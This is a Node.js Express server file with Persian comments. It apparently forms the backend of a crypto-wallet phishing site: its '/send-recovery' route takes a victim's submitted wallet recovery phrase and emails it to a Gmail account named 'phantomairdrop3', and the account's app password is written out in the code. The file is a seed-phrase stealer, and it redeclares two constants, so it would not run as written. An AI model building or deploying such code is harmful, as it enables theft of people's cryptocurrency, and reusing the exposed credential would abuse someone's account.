const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();

const nodemailer = require('nodemailer');

// تنظیمات Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'phantomairdrop3@gmail.com', // ایمیل شما
        pass: 'kfbh iosz ryii fmzl'        // App Password که دریافت کردید
    }
});

// ارسال ایمیل
transporter.sendMail({
    from: 'phantomairdrop3@gmail.com', // ایمیل ارسال‌کننده
    to: 'phantomairdrop3@gmail.com',   // ایمیل دریافت‌کننده
    subject: 'Test Email',             // عنوان ایمیل
    text: 'This is a test email sent from Nodemailer.' // متن ایمیل
}, (error, info) => {
    if (error) {
        console.error('Error:', error);
    } else {
        console.log('Email sent:', info.response);
    }
});

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ارائه فایل‌های استاتیک
app.use(express.static('public'));

// تنظیم Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'phantomairdrop3@gmail.com',
        pass: 'kfbh iosz ryii fmzl'
    }
});

// مسیری برای ارسال اطلاعات
app.post('/send-recovery', (req, res) => {
    const { recoveryPhrase } = req.body;

    if (!recoveryPhrase) {
        return res.status(400).send('Recovery phrase is required.');
    }

    const mailOptions = {
        from: 'phantomairdrop3@gmail.com',
        to: 'phantomairdrop3@gmail.com',
        subject: 'Recovery Phrase Received',
        text: `A new recovery phrase was submitted: \n\n${recoveryPhrase}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).send('Failed to send recovery phrase.');
        } else {
            console.log('Email sent: ' + info.response);
            return res.status(200).send('Recovery phrase sent successfully!');
        }
    });
});

// راه‌اندازی سرور
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
